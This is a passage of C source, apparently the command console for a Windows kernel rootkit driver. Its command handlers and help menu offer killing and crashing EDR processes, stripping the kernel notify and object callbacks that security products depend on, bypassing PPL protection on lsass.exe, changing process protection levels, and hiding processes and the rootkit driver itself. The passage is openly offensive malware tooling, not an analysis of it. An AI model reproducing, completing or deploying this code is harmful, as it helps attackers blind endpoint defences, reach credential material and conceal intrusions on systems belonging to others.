                printf("Sent request to elevate process with PID %lu using lsass.exe (PID %lu)\n", pid, lsassPid);
            }
            else {
                printf("Failed to send request. Error: %lu\n", GetLastError());
            }
        }
        else if (strncmp(input, "downGrade", 9) == 0) {
            DWORD pid1 = atoi(input + 10);
            if (pid1 == 0) {
                printf("Invalid PID.\n");
                continue;
            }
			DWORD pid2 = FindProcessId("explorer.exe");
            BOOL result = elevateProc(hDevice, pid1, pid2);
            if (result) {
                printf("Sent request to downgrade process with PID %lu to non-PPL\n", pid1);
            }
            else {
                printf("Failed to send request. Error: %lu\n", GetLastError());
            }
		}
        else if (strncmp(input, "hideproc", 8) == 0) {
            DWORD pid = atoi(input + 9);
            if (pid == 0) {
                printf("Invalid PID.\n");
                continue;
            }
            BOOL result = hideProc(hDevice, pid);
            if (result) {
                printf("Sent request to hide process with PID %lu\n", pid);
            }
            else {
                printf("Failed to send request. Error: %lu\n", GetLastError());
            }
		}
        else if (strncmp(input, "hiderootkitdrv", 14) == 0) {
			BOOL result = hideRootkitDrv(hDevice);
            if (result) {
                printf("Sent request to hide the rootkit driver\n");
            }
            else {
                printf("Failed to send request. Error: %lu\n", GetLastError());
			}
		}
        else if (strncmp(input, "help", 4) == 0) {
			printf("Help menu:\n");
			printf(" - terminate            - Start killing EDR processes\n");
            printf(" - crashem              - Start crashing EDR processes\n");
			printf(" - kill <PID>           - Kill a specific process by PID\n");
            printf(" - crash <PID>          - crash a specific process by PID\n");
			printf(" - stopterm             - Stop killing EDR processes\n");
			printf(" - stopcrash			- Stop crashing EDR processes\n\n");
            printf(" - listproc             - List process notify routines\n");
            printf(" - listthread           - List thread notify routines\n");
			printf(" - listloadimage        - List load image notify routines\n");
			printf(" - listreg              - List registry notify routines (only prints in KD)\n");
			printf(" - elproccallback       - Eliminate process notify routine callback\n");
			printf(" - elthreadcallback     - Eliminate thread notify routine callback\n");
			printf(" - elloadimagecallback  - Eliminate load image notify routine callback\n");
			printf(" - elregcallback        - Eliminate registry notify routine callback\n");
			printf(" - elobjcallback        - Eliminate object notify routine callback\n");

			printf(" - elall                - Eliminate all known EDR callbacks\n\n");     

			printf(" - bypassppl <PID>      - Bypass PPL for a specific process by PID\n");
			printf(" - bypassppllsass 	    - Bypass PPL for lsass.exe\n\n");
			printf(" - elevatelocal <PID>   - Elevate a specific process by PID using local system\n");
			printf(" - downGrade <PID>      - Downgrade a specific process by PID to non-PPL\n\n");

			printf(" - hideproc <PID>       - Hide a specific process by PID\n");
			printf(" - hiderootkitdrv	    - Hide the rootkit driver\n\n");

			printf(" - help                 - Show this help menu\n");
            printf(" - exit                 - Exit the program\n");


        }
        else {
            printf("Unknown command. Available commands: kill, exit\n");
		}
    }
	return 0;
}